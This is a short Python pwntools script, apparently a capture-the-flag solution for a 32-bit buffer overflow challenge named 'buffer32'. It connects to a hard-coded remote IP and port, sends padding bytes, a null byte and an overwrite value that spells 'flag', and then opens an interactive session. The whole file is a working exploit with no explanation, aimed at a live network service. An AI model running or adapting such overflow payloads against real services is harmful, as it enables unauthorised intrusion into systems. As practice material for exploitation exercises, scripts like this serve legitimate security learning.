from pwn import *

#r = process("./buffer32")
r = remote("103.200.7.150",30702)
offset = 19
target = p32(0x67616c66)
payload = ""
payload += "A"*offset + "\x00"
#payload += "A"*56
payload += target
r.sendline(payload)
r.interactive()

